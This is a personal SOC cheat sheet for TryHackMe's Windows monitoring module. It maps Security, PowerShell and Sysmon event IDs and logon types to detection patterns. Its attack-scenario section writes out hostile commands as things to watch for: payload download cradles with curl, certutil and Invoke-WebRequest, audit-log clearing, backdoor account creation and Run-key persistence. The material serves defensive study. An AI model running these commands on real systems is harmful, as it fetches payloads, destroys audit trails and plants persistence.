---
title: Windows Security Monitoring Cheat Sheet
description: Quick reference of Windows Security, PowerShell, and Sysmon Event IDs, Logon Types, and Threat Detection patterns from the Windows Security Monitoring module.
pubDate: 2026-11-03
categories:
  - SOC
  - Walkthrough
  - TryHackMe
  - Network
tags:
  - Lessons
image: /image/networksecess.png
---
---
## Summary

This is a personal cheat sheet and quick reference covering the core Event IDs, Logon Types, file system paths, and threat detection patterns from the **Windows Security Monitoring** module on TryHackMe (`Windows Logging for SOC`, `Windows Threat Detection 1`, `Windows Threat Detection 2`, and `Windows Threat Detection 3`).

---

## 1. Key Windows Log Sources & File Locations

By default, Windows stores `.evtx` log files inside **`C:\Windows\System32\winevt\Logs\`**. When investigating a host in Event Viewer (`eventvwr.msc`), these are the main logs we check:

| Log Source | Event Viewer Path | Default `.evtx` File Name | What It Captures |
| :--- | :--- | :--- | :--- |
| **Security** | `Windows Logs -> Security` | `Security.evtx` | User authentication (`4624`/`4625`), user/group management (`4720`/`4732`), process creation (`4688`), services (`4697`), and scheduled tasks (`4698`). |
| **System** | `Windows Logs -> System` | `System.evtx` | OS-level events, service state changes (`7045` new service installed), driver loads, and system reboots. |
| **PowerShell Operational** | `Applications and Services Logs -> Microsoft -> Windows -> PowerShell -> Operational` | `Microsoft-Windows-PowerShell%4Operational.evtx` | PowerShell execution details, including `Script Block Logging` (`4104`) and `Module Logging` (`4103`). |
| **Sysmon Operational** | `Applications and Services Logs -> Microsoft -> Windows -> Sysmon -> Operational` | `Microsoft-Windows-Sysmon%4Operational.evtx` | Detailed endpoint telemetry: process trees with hashes (`1`), network connections (`3`), file creation (`11`), Registry changes (`12`/`13`), Zone.Identifier streams (`15`), and DNS queries (`22`). |

---

## 2. Windows Security Event IDs (`Security.evtx`)

### Authentication & Logon Activity
| Event ID | Event Description | Key Fields to Check | SOC Use Case |
| :--- | :--- | :--- | :--- |
| **`4624`** | **An account was successfully logged on** | `Logon Type`, `Account Name`, `Source Network Address` (IP), `Workstation Name` (hostname), `Logon ID` | Spot successful RDP/SMB logins after a brute-force attack and correlate the session via `Logon ID`. |
| **`4625`** | **An account failed to log on** | `Logon Type`, `Account Name`, `Source Network Address`, `Failure Reason`, `Sub Status` | Detect password brute-forcing or password spraying (especially against `Administrator`). |
| **`4634` / `4647`** | **An account was logged off** | `Account Name`, `Logon ID` | Measure how long an attacker's interactive or network session lasted. |
| **`4672`** | **Special privileges assigned to new logon** | `Account Name`, `Privileges` (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.) | Triggered whenever an Administrator-equivalent account logs in. |

### Windows Logon Types (for Event IDs `4624` & `4625`)
Memorizing the `Logon Type` values makes it much faster to tell *how* someone logged into the machine:

| Logon Type | Name | Meaning & Common Investigation Notes |
| :--- | :--- | :--- |
| **`Type 2`** | **Interactive** | Local login directly at the physical console/keyboard. |
| **`Type 3`** | **Network** | SMB, network shares, RPC, or NTLM pre-auth before RDP. **Tip:** When an attacker connects via RDP, an `Event ID 4624` (`Logon Type 3`) often fires right before `Logon Type 10` and leaks the attacker's real **Workstation Name (hostname)** via NTLM. |
| **`Type 4`** | **Batch** | Scheduled Task execution. |
| **`Type 5`** | **Service** | Windows Service startup (`services.exe`). |
| **`Type 7`** | **Unlock** | Workstation was unlocked. |
| **`Type 10`** | **RemoteInteractive** | **RDP (Remote Desktop Protocol)** login with a GUI session. Look at `Source Network Address` to get the attacker's IP. |

### Account Management, Execution & Persistence (`Security.evtx`)
| Event ID | Event Description | Note / Policy Requirement | SOC Use Case |
| :--- | :--- | :--- | :--- |
| **`4688`** | **A new process has been created** | Requires *Audit Process Creation* (+ *Include command line* GPO). | Track executed commands (`CommandLine`) and parent-child relationships (`Creator Process Name`). |
| **`4720`** | **A user account was created** | Enabled by default. | Catch attackers creating local backdoor accounts (e.g., `net user support ... /add`). |
| **`4726`** | **A user account was deleted** | Enabled by default. | Detect attackers cleaning up temporary accounts. |
| **`4732`** | **A member was added to a security-enabled local group** | Enabled by default. | Catch privilege escalation when a new user is added to `BUILTIN\Administrators` or `Remote Desktop Users`. |
| **`4697`** | **A service was installed in the system** | Also logged in `System.evtx` as `Event ID 7045`. | Detect persistence via malicious Windows Services (`Service Name`, `Service File Name`). |
| **`4698`** | **A scheduled task was created** | Requires *Audit Other Object Access Events*. | Detect persistence via Scheduled Tasks (`Task Name` and the XML `<Command>` block). |
| **`1102`** | **The audit log was cleared** | Always logged in `Security.evtx`. | High-severity alert: attacker ran `wevtutil cl Security` or cleared logs in Event Viewer to cover their tracks. |

---

## 3. PowerShell Event IDs

| Event ID | Log Source | Description & Why It Matters |
| :--- | :--- | :--- |
| **`4104`** | `Microsoft-Windows-PowerShell/Operational` | **Script Block Logging**: Captures the full, deobfuscated content of PowerShell code blocks (`ScriptBlockText`) as they are executed in memory, even if the command line was base64-encoded (`-enc`). |
| **`4103`** | `Microsoft-Windows-PowerShell/Operational` | **Module Logging**: Records pipeline execution details and cmdlets invoked during a session. |
| **`400` / `800`** | `Windows PowerShell` (Legacy log) | Engine lifecycle startup (`400`) and pipeline execution details (`800`), including `HostApplication` (the command line that started PowerShell). |

---

## 4. Sysmon Event IDs (`Microsoft-Windows-Sysmon/Operational`)

Sysmon is the most valuable log source in the entire module because it links process GUIDs, file hashes, parent command lines, network connections, and DNS queries in one place:

| Event ID | Category (`RuleName`) | Key Fields to Check | What We Use It For |
| :--- | :--- | :--- | :--- |
| **`1`** | **ProcessCreate** | `Image`, `CommandLine`, `ParentImage`, `ParentCommandLine`, `ProcessId`, `Hashes`, `OriginalFileName` | Reconstruct the entire process tree, spot renamed binaries via `OriginalFileName`, and get the MD5/SHA256 hash of any executed payload. |
| **`3`** | **NetworkConnect** | `Image`, `SourceIp`, `DestinationIp`, `DestinationPort`, `DestinationHostname` | Catch C2 callbacks or reverse shells and immediately see which executable (`Image`) opened the socket. |
| **`5`** | **ProcessTerminate** | `Image`, `ProcessId`, `ProcessGuid` | Useful shortcut to find the `PID` of a short-lived malware binary and see when it exited. |
| **`10`** | **ProcessAccess** | `SourceImage`, `TargetImage`, `GrantedAccess` | Detect credential dumping (such as `mimikatz.exe` accessing `C:\Windows\System32\lsass.exe`) or process injection. |
| **`11`** | **FileCreate** | `Image` (process that created it), `TargetFilename` | Track where archives are extracted (`Explorer.EXE`), where droppers write payloads, or where stealers stage stolen files. |
| **`12` / `13`** | **RegistryEvent** (Object Create/Delete & Value Set) | `EventType` (`SetValue`), `Image`, `TargetObject`, `Details` | Detect Registry persistence (e.g., `HKCU\...\CurrentVersion\Run\Basket` set to `C:\Users\Public\kitten.exe`). |
| **`15`** | **FileCreateStreamHash** | `Image`, `TargetFilename` (`:Zone.Identifier`), `Contents` (`HostUrl`, `ReferrerUrl`), `Hash` | **Browser Downloads**: When a user downloads a file in Chrome/Edge, Windows creates an Alternate Data Stream (`Zone.Identifier`). `Event ID 15` shows the exact download URL (`HostUrl`) and file hash! |
| **`22`** | **DnsQuery** | `Image`, `QueryName`, `QueryResults`, `ProcessId` | See every domain (`QueryName`) a process tried to resolve, including C2 domains (`rjj.store`, `*.workers.dev`) and exfiltration endpoints (`*.s3.amazonaws.com`). |

---

## 5. Attack Scenarios & Investigation Patterns (Module Recap)

### A. Initial Access (`Windows Threat Detection 1`)
1. **RDP Brute Force**:
   - Many `Event ID 4625` failures -> followed by `Event ID 4624` (`Logon Type 10` for RDP IP, and `Logon Type 3` two seconds earlier for the attacker's `Workstation Name`).
2. **Phishing File Tricks**:
   - **Misleading `.com` extension**: Files like `www.skype.com` look like domains, but `.com` is an executable MS-DOS application format on Windows.
   - **Malicious `.lnk` Shortcuts**: Check `Properties -> Shortcut -> Target` for hidden `powershell.exe ... iwr http://...` download cradles.
   - **Double Extensions**: Files like `best-cat.jpg.exe` hide the `.exe` part when Windows File Explorer has *File name extensions* unchecked.
   - **Tracking in Sysmon**: `Event ID 15` (`msedge.exe`/`chrome.exe` downloading `.zip` + `Zone.Identifier` URL) -> `Event ID 11` (`Explorer.EXE` extracting `.exe`) -> `Event ID 1` / `5` (execution & PID) -> `Event ID 22` / `3` (C2 DNS lookup & connection).
3. **USB Malware**:
   - `Event ID 1` shows execution from a removable drive letter (`E:\Open Sandisk 4GB USB.exe`) -> `Event ID 11` shows local dropper creation (`C:\Users\Public\Documents\winupdate.exe`) and worm propagation to other drives (`F:\...`).

### B. Discovery, Collection & Ingress Tool Transfer (`Windows Threat Detection 2`)
1. **Post-Compromise Discovery (`Event ID 1`)**:
   - Attackers and malware immediately run enumeration commands (`whoami.exe`, `net.exe` / `net1.exe`, `ipconfig.exe`, `systeminfo.exe`, `tasklist.exe`).
   - Watch for EDR/AV checks in command lines, such as `tasklist /v | findstr MsSense.exe` (checking for Microsoft Defender for Endpoint).
2. **Collection & Exfiltration**:
   - **Common Stealer Targets**: Browser password stores (`Chrome` Login Data), SSH keys (`C:\Users\<User>\.ssh\`), sensitive PDFs/diagrams, and the Windows Clipboard (`powershell -c "Get-Clipboard"`).
   - **Staging Folders**: Look for `xcopy.exe` or `robocopy.exe` in `Event ID 1` copying `*.docx`, `*.pdf`, `*.xlsx` into a temporary folder (`AppData\Local\Temp\...\staging_...`) before a DNS query (`Event ID 22`) to an exfiltration domain or cloud bucket (`s3.amazonaws.com`).
3. **Ingress Tool Transfer (LOLBins)**:
   - Always check `Event ID 1` (`CommandLine`) for built-in Windows utilities abused to download payloads:
     - `curl.exe http://<url>/<file>`
     - `certutil.exe -urlcache -f http://<url>/<file>`
     - `powershell -c "Invoke-WebRequest -Uri 'http://...' -OutFile '...'"` (or `iwr`)

### C. Command & Control (C2) and Persistence (`Windows Threat Detection 3`)
1. **C2 Infrastructure**:
   - Attackers frequently hide C2 binaries in `C:\Users\<User>\AppData\Roaming\` and route C2 traffic through legitimate cloud services (like Cloudflare Workers `*.workers.dev`) so outbound HTTPS traffic blends in.
2. **Four Core Persistence Mechanisms & How to Spot Them**:
   - **Backdoor Local Admin**: `Event ID 4720` (user created) + `Event ID 4732` (added to `Administrators`).
   - **Malicious Windows Service**: `Event ID 4697` in `Security.evtx` (or `7045` in `System.evtx`). After reboot, the service binary's `ParentImage` in Sysmon `Event ID 1` will be `C:\Windows\System32\services.exe`.
   - **Scheduled Task**: `Event ID 4698` in `Security.evtx` shows the task name and `<Command>`. After reboot, the payload's `ParentCommandLine` in Sysmon `Event ID 1` will be `C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule`.
   - **Startup Folder & Registry Run Keys**:
     - **Startup Folder**: Files dropped in `C:\Users\<User>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\` (or `C:\ProgramData\...`) are launched at logon with `ParentImage: C:\Windows\Explorer.EXE`.
     - **Registry Run Keys**: Look for `reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"` in `Event ID 1` or `SetValue` in Sysmon `Event ID 13`.
